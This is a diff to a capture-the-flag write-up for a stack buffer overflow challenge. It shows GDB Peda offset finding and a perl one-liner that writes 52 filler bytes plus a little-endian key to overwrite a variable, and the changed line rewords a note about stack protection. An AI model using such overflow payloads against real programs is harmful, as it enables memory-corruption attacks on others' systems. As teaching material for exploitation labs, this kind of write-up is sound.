@@ -17,6 +17,6 @@ GDB Peda:
 13. pattern offset AAGAAcAA2AAH -- offset is 52 therefor it's 52 bytes from our input.
 14. Finally, we overflow the buffer with 52bytes so that we can write the correct key to to the proper location (over the key variable)
 15. perl -e 'print "A"x52 . "\xbe\xba\xfe\xca"' | ./overflow (the location is backwards because it's little endian
-16. Kali has smash stacking protection so you WILL get an error. But that's normal. If you want to test this you can solve the original challenge at pwnable.kr:9000
+16. Somtimes binaries are compiled with stack protection so you may get an error. But that's normal. If you want to test this you can solve the original challenge at pwnable.kr:9000
 
 Use my bufoverflow_remote.py template from my "tools" repo for easy payload deploy!
